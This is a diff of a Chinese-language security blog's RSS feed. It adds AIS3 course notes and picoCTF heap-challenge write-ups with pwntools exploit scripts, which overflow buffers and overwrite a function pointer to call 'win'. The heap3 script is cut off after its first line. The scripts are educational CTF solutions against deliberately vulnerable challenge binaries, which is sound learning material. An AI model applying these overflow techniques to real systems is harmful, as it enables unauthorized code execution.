+&lt;p>ex: open 7000 port -&amp;gt; 一直拿到 GPS 資訊&lt;/p></description></item><item><title>【AIS3】從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</guid><description>&lt;h1 id="從遊戲學-windows-reverse---除了-f5-之外還有哪幾招">從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招&lt;/h1>
 &lt;p>&lt;code>-undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇&lt;/code>&lt;/p>
 &lt;h2 id="link-start">Link Start!&lt;/h2>
 &lt;h3 id="分析目標的五個階段">分析目標的五個階段&lt;/h3>
@@ -827,7 +1227,16 @@ RHOST: 10.129.11.184
 &lt;h3 id="ctf">CTF&lt;/h3>
 &lt;ul>
 &lt;li>
-&lt;p>一場好的 CTF 會讓你學到技術&lt;/p></description></item><item><title>【AIS3】威脅情資＆機器學習</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</guid><description>&lt;h1 id="威脅情資機器學習">威脅情資＆機器學習&lt;/h1>
+&lt;p>一場好的 CTF 會讓你學到技術&lt;/p>
+&lt;ul>
+&lt;li>0ctf 2019 - AddressSanitizer 保護機制&lt;/li>
+&lt;li>*ctf - oob-v8，怎麼打 Browser&lt;/li>
+&lt;li>0ctf 2020 - Chromium RCE&lt;/li>
+&lt;li>DEFCON 2022 QUAL - ncuts，兩萬多個 binary 解 reverse 拼出 flag.jpg&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>初學階段&lt;/p></description></item><item><title>【AIS3】威脅情資＆機器學習</title><link>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</link><pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d1_2/</guid><description>&lt;h1 id="威脅情資機器學習">威脅情資＆機器學習&lt;/h1>
 &lt;p>&lt;code>-奧義智慧科技 資安研究處長 陳仲寬 ＆ 資安研究員 陳憶賢 ＆ 資安研究員 黃俊嘉 ＆ 資安研究員 陳勝舢&lt;/code>&lt;/p>
 &lt;h2 id="about-the-course">About the Course&lt;/h2>
 &lt;p>We believe AI will change the landscape of cybersecurity, therefore, in this course, we would like to
@@ -1084,7 +1493,337 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【系統安全】Stack Overflow</title><link>https://ja-errorpro.codes/posts/2024/stack_overflow/</link><pubDate>Fri, 05 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/stack_overflow/</guid><description>&lt;h1 id="先備知識">先備知識&lt;/h1>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;./chall&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;tethys.picoctf.net&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">49849&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">&amp;#34;2&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>&lt;span style="color:#bd93f9">50&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;4&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="heap1">heap1&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;./chall&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;tethys.picoctf.net&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">59124&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">&amp;#34;2&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>&lt;span style="color:#bd93f9">0x20&lt;/span>&lt;span style="color:#ff79c6">+&lt;/span>&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#39;pico&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;4&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="heap2">heap2&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#ff79c6">=&lt;/span> context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> ELF(&lt;span style="color:#f1fa8c">&amp;#39;./chall&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;mimas.picoctf.net&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">56745&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#39;2&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>win &lt;span style="color:#ff79c6">=&lt;/span> elf&lt;span style="color:#ff79c6">.&lt;/span>symbols[&lt;span style="color:#f1fa8c">&amp;#39;win&amp;#39;&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendlineafter(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#39;Data for buffer: &amp;#39;&lt;/span>, &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>&lt;span style="color:#bd93f9">0x20&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> p64(win))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#39;4&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="heap3">heap3&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
